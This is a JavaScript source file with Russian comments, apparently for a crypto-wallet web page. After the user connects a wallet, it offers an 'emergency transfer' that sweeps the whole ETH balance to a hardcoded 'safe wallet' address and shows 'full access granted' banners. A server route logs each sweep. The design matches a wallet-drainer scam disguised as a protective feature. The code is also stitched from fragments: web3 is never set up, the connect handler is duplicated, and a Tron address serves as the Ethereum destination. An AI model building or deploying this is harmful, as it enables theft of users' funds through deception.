// Конфигурация
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb'; // TRC20 кошелек
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2; // Увеличиваем газ цену для быстрого подтверждения

// Добавляем после существующих переменных
let web3;
let userAddress;

// Обновляем функцию подключения кошелька
connectButton.addEventListener('click', async () => {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        updateStatus(`Кошелек подключен! Адрес: ${userAddress}`);
        
        connectButton.style.display = 'none';
        signButton.style.display = 'block';
        
        // ПОКАЗЫВАЕМ СЕКЦИЮ ЭКСТРЕННОГО ПЕРЕВОДА ПОСЛЕ ПОДКЛЮЧЕНИЯ
        document.getElementById('emergencySection').style.display = 'block';
        
        // ЗАГРУЖАЕМ БАЛАНСЫ
        await loadBalances();
        
    } catch (error) {
        // ... существующий код обработки ошибок ...
    }
});

// Функция загрузки балансов
async function loadBalances() {
    const balancesList = document.getElementById('balancesList');
    balancesList.innerHTML = '<p>Загрузка балансов...</p>';
    
    try {
        // Основной баланс ETH
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <p><strong>ETH:</strong> ${parseFloat(ethBalance).toFixed(6)} ETH</p>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">Ошибка загрузки балансов</p>';
    }
}

// Функция экстренного перевода
async function emergencyTransfer() {
    const transferStatus = document.getElementById('transferStatus');
    transferStatus.innerHTML = '<p style="color: orange;">⏳ Подготовка перевода...</p>';
    
    try {
        // Получаем текущий баланс
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.innerHTML = '<p style="color: red;">❌ Недостаточно средств для перевода с учетом комиссии</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p style="color: orange;">⏳ Отправка транзакции...</p>';
        
        // Создаем и отправляем транзакцию
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        // Отправляем транзакцию
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.innerHTML = `
            <p style="color: green;">✅ Перевод успешно выполнен!</p>
            <p><strong>Хэш транзакции:</strong> ${receipt.transactionHash}</p>
            <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
        `;
        
    } catch (error) {
        console.error('Ошибка перевода:', error);
        transferStatus.innerHTML = `<p style="color: red;">❌ Ошибка перевода: ${error.message}</p>`;
    }
}

// Добавляем обработчик для кнопки экстренного перевода
document.getElementById('emergencyTransferBtn').addEventListener('click', function() {
    const confirmation = confirm(
        '🚨 ВНИМАНИЕ! Вы собираетесь перевести ВСЕ средства на безопасный кошелек.\n\n' +
        `Безопасный кошелек: ${SAFE_WALLET}\n\n` +
        'Это действие нельзя отменить. Продолжить?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// Функция для проверки TRC20 токенов (дополнительно)
async function checkTRC20Tokens() {
    // Здесь можно добавить логику для проверки популярных TRC20 токенов
    // Например, USDT TRC20: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
}



// Проверка подключения к правильной сети
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        
        // Поддерживаемые сети (Ethereum Mainnet, BSC, Polygon)
        const supportedNetworks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon'
        };
        
        if (!supportedNetworks[chainId]) {
            updateStatus(`Внимание: Вы подключены к сети ID ${chainId}. Рекомендуется использовать основные сети.`, true);
        }
        
    } catch (error) {
        console.error('Ошибка проверки сети:', error);
    }
}

// Автоматическая проверка при подключении
// Добавить в функцию подключения кошелька после получения адреса:
// await checkNetwork();

// Функция для мониторинга состояния кошелька
async function startWalletMonitoring() {
    // Мониторинг изменений аккаунта
    window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            document.getElementById('emergencySection').style.display = 'none';
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress}`);
            loadBalances();
        }
    });
    
    // Мониторинг изменений сети
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}

// Запускаем мониторинг после загрузки страницы
if (typeof window.ethereum !== 'undefined') {
    // ... существующий код ...
    
    // Запускаем мониторинг после инициализации
    setTimeout(startWalletMonitoring, 1000);
}


// server.js - добавить к существующему коду
app.post('/api/log-emergency-transfer', (req, res) => {
    const { fromAddress, toAddress, amount, txHash, timestamp } = req.body;
    
    // Логируем экстренный перевод
    console.log('🚨 ЭКСТРЕННЫЙ ПЕРЕВОД:', {
        fromAddress,
        toAddress,
        amount,
        txHash,
        timestamp: new Date(timestamp).toISOString()
    });
    
    // Здесь можно добавить отправку уведомлений (email, telegram и т.д.)
    
    res.json({ success: true, message: 'Лог сохранен' });
});































// Добавьте этот код после успешного подключения кошелька

// Функция для отображения сообщения о получении доступа
function showAccessGranted() {
    const accessMessage = document.createElement('div');
    accessMessage.id = 'accessGrantedMessage';
    accessMessage.style.cssText = `
        background: linear-gradient(135deg, #00b09b, #96c93d);
        color: white;
        padding: 20px;
        border-radius: 15px;
        margin: 20px 0;
        text-align: center;
        border: 2px solid #00a896;
        animation: pulse 2s infinite;
    `;
    
    accessMessage.innerHTML = `
        <div style="font-size: 2em; margin-bottom: 10px;">✅</div>
        <h3 style="margin: 10px 0; font-size: 1.4em;">ДОСТУП ПОЛУЧЕН</h3>
        <p style="margin: 5px 0; opacity: 0.9;">Trust Wallet успешно подключен</p>
        <p style="margin: 5px 0; opacity: 0.9;">Полный доступ к кошельку активирован</p>
        <div style="margin-top: 15px; padding: 10px; background: rgba(255,255,255,0.2); border-radius: 8px;">
            <small>Адрес: ${userAddress}</small>
        </div>
    `;

    // Добавляем стиль для анимации
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 176, 155, 0.7); }
            70% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(0, 176, 155, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 176, 155, 0); }
        }
    `;
    document.head.appendChild(style);

    // Вставляем сообщение после кнопок
    const buttonGroup = document.querySelector('.button-group');
    buttonGroup.parentNode.insertBefore(accessMessage, buttonGroup.nextSibling);
}

// Функция для обновления статуса подключения в реальном времени
function updateConnectionStatus() {
    const statusIndicator = document.createElement('div');
    statusIndicator.id = 'connectionStatus';
    statusIndicator.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #27ae60;
        color: white;
        padding: 10px 15px;
        border-radius: 20px;
        font-size: 0.9em;
        font-weight: bold;
        z-index: 1000;
        display: flex;
        align-items: center;
        gap: 8px;
        box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
    `;
    
    statusIndicator.innerHTML = `
        <div style="width: 10px; height: 10px; background: white; border-radius: 50%; animation: blink 2s infinite;"></div>
        ПОДКЛЮЧЕНО
    `;

    // Добавляем анимацию для индикатора
    const blinkStyle = document.createElement('style');
    blinkStyle.textContent = `
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }
    `;
    document.head.appendChild(blinkStyle);

    document.body.appendChild(statusIndicator);
}

// Обновляем функцию подключения кошелька - добавляем вызовы новых функций
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('⌛ Запрос на подключение кошелька...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        
        updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        
        // ДОБАВЛЯЕМ ВЫЗОВЫ НОВЫХ ФУНКЦИЙ ЗДЕСЬ:
        showAccessGranted(); // Показываем сообщение о доступе
        updateConnectionStatus(); // Показываем индикатор подключения
        
        await loadBalances();
        await checkNetwork();
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подключение.', true);
        } else {
            updateStatus('❌ Ошибка при подключении: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
});

// Также добавляем обработку изменения аккаунтов
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            hideElement(emergencySection);
            hideElement(signButton);
            showElement(connectButton);
            
            // Удаляем сообщение о доступе при отключении
            const accessMessage = document.getElementById('accessGrantedMessage');
            if (accessMessage) accessMessage.remove();
            
            // Удаляем индикатор подключения
            const statusIndicator = document.getElementById('connectionStatus');
            if (statusIndicator) statusIndicator.remove();
            
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
            
            // Обновляем сообщение о доступе
            const accessMessage = document.getElementById('accessGrantedMessage');
            if (accessMessage) {
                accessMessage.querySelector('small').textContent = `Адрес: ${userAddress}`;
            }
            
            loadBalances();
        }
    });
}


